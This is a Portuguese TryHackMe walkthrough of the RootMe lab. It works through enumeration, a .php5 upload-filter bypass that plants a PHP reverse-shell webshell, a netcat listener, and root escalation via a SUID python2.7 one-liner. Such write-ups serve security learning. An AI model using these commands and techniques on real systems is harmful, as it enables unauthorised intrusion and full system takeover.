# 🧨 RootMe – TryHackMe Walkthrough

> 🧠 **Autor:** T3lphi  
> 🎯 **Plataforma:** TryHackMe  
> 🟢 **Dificuldade:** Easy  
> 📅 **Data:** 15/05/2026  
> 🧪 **Foco:** Web exploitation • Upload bypass • Privilege escalation (Linux)

---

## 🧭 Visão geral

A máquina **RootMe** é um laboratório clássico de exploração web onde o caminho até root passa por:

- 🔎 Enumeração de serviços e diretórios
- 📂 Descoberta de endpoint de upload
- 🚀 Bypass de restrição de extensão
- 🐚 Reverse shell via webshell
- 🔐 Escalada de privilégios via binário SUID

💡 O coração do desafio está em um **upload inseguro de arquivos PHP**.

---

# 🕵️ 1. Enumeração inicial

## 🔎 Scan de portas

```bash
nmap -sV -sC -Pn 10.64.163.204
| Porta | Serviço | Versão        |
| ----- | ------- | ------------- |
| 22    | SSH     | OpenSSH 8.2p1 |
| 80    | HTTP    | Apache 2.4.41 |
```

# 🔎 1. Enumeração de diretórios

```bash
gobuster dir -u http://10.64.163.204 -w /usr/share/wordlists/dirbuster/directory-list-2-small.txt

📌 Achados
/uploads
/css
/js
/**** ⭐
```
👉 O /**** contém o sistema de upload. 

**observação: o nome do diretório foi alterado por ele ser uma flag do ctf.**

# 📂 2. Exploração – Upload bypass

📤 Painel de upload
```bash
http://10.64.163.204/****/
```

## 2.1 🐚 Webshell PHP

Arquivo utilizado:
```bash
/usr/share/webshells/php/php-reverse-shell.php
```
## 2.2 ✏️ Configuração do Webshell PHP

Editar IP e porta do atacante.

## 2.3 ⚠️ Bypass de extensão

Extensão bloqueada: .php

✔️ Extensão funcional:

.php5

## 2.4 📁 Upload bem-sucedido
visitar /uploads/ e executar o script.

# 🎯 3. Reverse shell

## 3.1 📡 Listener
```bash
nc -lvnp 4444
```
💥 Execução

Ao acessar o arquivo enviado, recebemos shell reverso.

## 3.2 🧼 Estabilizando shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# 👤 4. Pós-exploração
cd /home

ls

Sem dados relevantes encontrados nos usuários.

# 🔐 5. Escalada de privilégios


## 5.1 🔎 Procurar por SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

## 5.2 ⚡ Achado crítico

### /usr/bin/python2.7


# 6 💥 Exploração
```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

## 🎉 Root access obtido!


# 🏁 7. Flags

## 7.1 👤 User flag
/var/www/user.txt

## 7.2 🔑 Root flag
/root/root.txt


# 8 🧠 Conclusão

A RootMe explora:

Upload inseguro de arquivos
Falta de validação de extensão
Execução de webshell
SUID mal configurado (Python2.7)

# 9 💡 Lições importantes
Validação de upload deve checar conteúdo, não só extensão
Webshells continuam sendo um vetor simples e eficaz
SUID em interpretadores é crítico e perigoso